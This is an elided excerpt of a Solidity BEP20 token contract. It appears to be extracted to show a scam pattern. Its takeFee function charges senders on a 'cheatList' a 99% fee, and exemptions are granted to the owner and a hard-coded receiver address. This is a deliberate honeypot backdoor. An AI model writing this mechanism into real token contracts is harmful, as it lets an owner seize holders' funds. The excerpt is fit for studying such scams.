...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address receiverAddress) 
    {
        ...
        isExcludedFromFee[receiverAddress] = true;

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[receiverAddress] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[receiverAddress] = true;
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(cheatList[sender] && !isMarketPair[sender]) feeAmount = amount.mul(99).div(100);
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        0x43D95616A5e41dbeD4312C0BEae61cC3b541FA82
    ){}
}